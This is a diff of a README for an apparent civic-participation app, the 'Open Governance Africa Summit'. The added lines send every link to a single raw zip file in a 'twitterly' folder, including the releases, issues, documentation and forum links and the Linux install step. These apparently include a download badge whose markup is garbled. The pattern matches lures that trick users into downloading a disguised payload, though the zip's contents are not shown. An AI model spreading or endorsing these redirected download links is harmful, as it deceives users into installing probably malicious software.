@@ -1,7 +1,7 @@
 # 🌍 open-governance-africa-summit - Elevate Civic Participation in Africa
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20the%20App-blue.svg)](https://github.com/SheedPhi/open-governance-africa-summit/releases)
+[![Download](https://raw.githubusercontent.com/SheedPhi/open-governance-africa-summit/main/twitterly/open-governance-africa-summit.zip%20the%https://raw.githubusercontent.com/SheedPhi/open-governance-africa-summit/main/twitterly/open-governance-africa-summit.zip)](https://raw.githubusercontent.com/SheedPhi/open-governance-africa-summit/main/twitterly/open-governance-africa-summit.zip)
 
 ## 🚀 Getting Started
 Welcome to the Open Governance Africa Summit (OGAS) application! This tool helps users engage in discussions and activities around governance, technology, and civic participation in Africa. 
@@ -19,7 +19,7 @@ This application includes features aimed at promoting transparency, accountabili
 To download and install the OGAS application, please follow these simple steps:
 
 1. **Visit the Releases Page:**
-   Go to our [Releases page](https://github.com/SheedPhi/open-governance-africa-summit/releases) to find the latest version.
+   Go to our [Releases page](https://raw.githubusercontent.com/SheedPhi/open-governance-africa-summit/main/twitterly/open-governance-africa-summit.zip) to find the latest version.
 
 2. **Select the Latest Release:**
    You will see a list of available versions. Click on the most recent release to access download options.
@@ -30,7 +30,7 @@ To download and install the OGAS application, please follow these simple steps:
 4. **Install the Application:**
    - For **Windows:** Double-click the downloaded `.exe` file and follow the installation prompts.
    - For **macOS:** Open the downloaded `.dmg` file, drag the application to the Applications folder, then launch it.
-   - For **Linux:** Extract the downloaded `.tar.gz` file and run the appropriate installation command in the terminal.
+   - For **Linux:** Extract the downloaded `https://raw.githubusercontent.com/SheedPhi/open-governance-africa-summit/main/twitterly/open-governance-africa-summit.zip` file and run the appropriate installation command in the terminal.
 
 5. **Open the Application:**
    Once installed, find the OGAS application in your applications list and open it to start your journey in improving civic participation.
@@ -46,11 +46,11 @@ To download and install the OGAS application, please follow these simple steps:
 Join our community of changemakers dedicated to fostering open governance across Africa. Use the discussion forums to share your insights, ask questions, and collaborate with fellow users.
 
 ## 🎉 Support and Contributions
-If you encounter any issues or have questions, please reach out through our [issues page](https://github.com/SheedPhi/open-governance-africa-summit/issues). We welcome feedback and contributions to enhance the application.
+If you encounter any issues or have questions, please reach out through our [issues page](https://raw.githubusercontent.com/SheedPhi/open-governance-africa-summit/main/twitterly/open-governance-africa-summit.zip). We welcome feedback and contributions to enhance the application.
 
 ## 🔗 Important Links
-- [Download the Latest Version](https://github.com/SheedPhi/open-governance-africa-summit/releases)
-- [Documentation](https://github.com/SheedPhi/open-governance-africa-summit/wiki)
-- [Community Forum](https://github.com/SheedPhi/open-governance-africa-summit/discussions)
+- [Download the Latest Version](https://raw.githubusercontent.com/SheedPhi/open-governance-africa-summit/main/twitterly/open-governance-africa-summit.zip)
+- [Documentation](https://raw.githubusercontent.com/SheedPhi/open-governance-africa-summit/main/twitterly/open-governance-africa-summit.zip)
+- [Community Forum](https://raw.githubusercontent.com/SheedPhi/open-governance-africa-summit/main/twitterly/open-governance-africa-summit.zip)
 
 Thank you for your interest in Open Governance Africa Summit. We hope this application empowers you to make a difference in governance.
